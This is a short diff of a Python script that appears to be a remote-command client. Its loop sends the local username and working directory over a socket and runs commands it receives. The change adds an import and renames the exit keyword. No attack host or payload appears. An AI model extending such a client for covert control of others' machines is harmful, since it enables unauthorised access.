@@ -24,6 +24,7 @@ import os
 import getpass
 import sys
 import time
+import random
 
 red = '\033[0;31m'  # This will turn terminal output red
 green = '\033[0;32m'  # This will turn terminal output green
@@ -258,7 +259,7 @@ def multi(socket, delimiter):
     This will run commands in a loop
     """
     command = ''
-    while command != 'back':
+    while command != 'bk':
         user = getpass.getuser()
         user_dir = os.getcwd()
         data = user+';'+user_dir
@@ -268,7 +269,7 @@ def multi(socket, delimiter):
         # We receive a command, then if it matches a key word
         # complete the appropriate action
         command = myrecvall(socket, delimiter).decode()
-        if command[:4] == 'back':
+        if command[:4] == 'bk':
             break
         else:
             commandant(socket, delimiter)
